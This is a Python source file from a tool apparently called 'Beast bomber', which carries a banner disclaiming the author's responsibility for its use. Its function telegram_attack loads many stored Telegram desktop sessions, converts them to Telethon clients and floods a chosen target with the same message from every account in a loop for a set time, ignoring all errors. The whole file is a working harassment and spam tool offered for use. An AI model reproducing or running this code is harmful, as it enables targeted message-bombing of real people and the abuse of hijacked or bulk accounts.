"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import os
import time
from threading import Thread
from opentele.td import TDesktop
from opentele.api import UseCurrentSession

async def telegram_attack(target, time_a, mes):
    clients = {}
    accounts_dir = os.path.abspath('input/telegram_accounts')

    for user in os.listdir(accounts_dir):
        acc_dir = os.path.join(accounts_dir, user)
        acc_file = os.path.join(acc_dir, 'tdata')
        session_file = f"{acc_file}.session"
        if session_file.endswith('.session - journal'):
            session_file = session_file[:-17]
        elif session_file.endswith('.session'):
            session_file = session_file[:-8]

        if os.path.exists(session_file):
            tdesk = TDesktop(acc_file)
            clients[user] = await tdesk.ToTelethon(session=session_file, flag=UseCurrentSession)

    t = time.monotonic()
    while time.monotonic() - t < time_a:
        for user, client in clients.items():
            try:
                async with client:
                    await client.send_message(target, mes)
            except:
                pass